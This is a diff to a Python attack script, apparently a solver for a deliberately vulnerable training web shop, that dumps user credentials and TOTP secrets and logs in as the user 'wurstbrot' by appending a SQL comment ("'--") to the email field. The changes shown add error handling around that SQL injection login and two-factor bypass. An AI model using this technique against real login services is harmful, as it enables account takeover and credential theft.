@@ -2,9 +2,6 @@ import requests
 from Attacks.Maxence.UserCredentials import UserCredentials
 import pyotp
 
-
-
-
 class TFA:
     def __init__(self, base_url):
         self.base_url = base_url
@@ -18,6 +15,8 @@ class TFA:
 
     def login_as_wurstbrot(self, password="whatever"):
         email, secret = self.handling_totpKey()
+        if email == False:
+            return False, self.text
         email = email + "'--"
         payload = {"email": email, "password": password}
         response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers)
@@ -52,7 +51,9 @@ class TFA:
     def handling_totpKey(self):
         db_text = UserCredentials.db_drop(self=UserCredentials(self.base_url))
         wurst_info = ""
-
+        if "Fail with http code" in db_text:
+            self.log("User Credentials error message: " + db_text)
+            return False, ""
         for string in db_text.split(",{"):
             if "wurstbrot" in string: # Change here to search for another user with Two Factor Authentification
                 wurst_info = string.split("}")[0]
